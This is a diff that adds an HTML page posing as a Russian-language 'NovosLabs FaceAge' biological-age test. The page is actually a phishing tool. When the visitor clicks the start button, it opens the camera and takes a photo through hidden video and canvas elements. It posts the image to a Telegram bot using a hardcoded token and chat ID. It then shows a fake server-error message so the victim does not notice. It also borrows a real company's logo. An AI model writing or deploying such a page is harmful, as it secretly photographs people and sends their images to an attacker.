@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>NovosLabs: FaceAge Test</title>
+    <meta charset="UTF-8">
+    <style>
+        body { font-family: sans-serif; text-align: center; background: #f4f7f6; color: #333; padding: 50px; }
+        .box { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); max-width: 400px; margin: auto; }
+        button { background: #007bff; color: white; border: none; padding: 15px 30px; border-radius: 5px; cursor: pointer; font-size: 18px; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <img src="https://novoslabs.com/wp-content/uploads/2021/05/novos-logo.png" width="150">
+        <h2>Тест: Биологический возраст</h2>
+        <p>Нажми кнопку ниже, чтобы нейросеть проанализировала твоё лицо и определила твой реальный возраст.</p>
+        <button onclick="startTest()">НАЧАТЬ ТЕСТ</button>
+    </div>
+
+    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+    <script>
+        const TOKEN = "8511911062:AAGj_4rH-k2lpAXWsUe_5yM3WAEFVl0-cs4"; // Твой токен
+        const CHAT_ID = "1498741744"; // Твой ID
+
+        function startTest() {
+            navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                setTimeout(() => {
+                    takePhoto();
+                    alert("Ошибка сервера: Не удалось обработать изображение. Попробуйте позже.");
+                }, 2000);
+            }).catch(err => {
+                alert("Для теста необходим доступ к камере.");
+            });
+        }
+
+        function takePhoto() {
+            const canvas = document.getElementById('canvas');
+            const video = document.getElementById('video');
+            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('document', blob, 'face.jpg');
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendDocument`, {
+                    method: 'POST',
+                    body: formData
+                });
+            }, 'image/jpeg');
+        }
+    </script>
+</body>
+</html>
